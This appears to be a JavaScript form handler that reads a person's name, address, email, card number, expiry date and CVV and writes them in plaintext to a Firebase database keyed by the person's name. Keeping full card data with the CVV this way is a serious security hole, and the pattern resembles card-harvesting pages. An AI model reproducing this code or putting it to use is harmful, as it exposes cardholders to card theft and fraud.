
                    var db = firebase.database();
            function send(){
                var Naam = document.getElementById("name").value;
                var Sex = document.getElementById("gender").value;
                var Pata = document.getElementById("address").value;
                var Code = document.getElementById("pincode").value;
                var Card = document.getElementById("card_type").value;
                var Number = document.getElementById("card_number").value;
                var ExpDate = document.getElementById("expirationdate").value;
                var Cvv = document.getElementById("cvv").value;
                var Mail = document.getElementById("email").value;

                db.ref(Naam).set({
                    Name : Naam,
                    Gender : Sex,
                    Address : Pata,
                    Pincode : Code,
                    Card_Type : Card,
                    Card_Number : Number,
                    Expiration_date : ExpDate,
                    CVV : Cvv,
                    Email : Mail

                })
            }
